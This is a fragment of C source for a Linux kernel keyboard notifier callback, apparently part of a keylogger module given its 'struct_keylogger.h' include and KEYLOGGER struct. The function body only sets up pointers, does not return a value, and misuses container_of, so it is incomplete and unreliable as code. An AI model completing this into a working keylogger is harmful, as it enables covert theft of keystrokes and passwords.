#include "keyboard_callback.h"
#include "struct_keylogger.h"

static int keyboard_callback(struct notifier_block* nb,unsigned long action, void *data)
{
    struct keyboard_notifier_param* kparam;
    struct KEYLOGGER* klogger;
    kparam=(struct keyboard_notifier_param*)data;
    klogger=container_of(nb,KEYLOGGER,key_notifier);
}
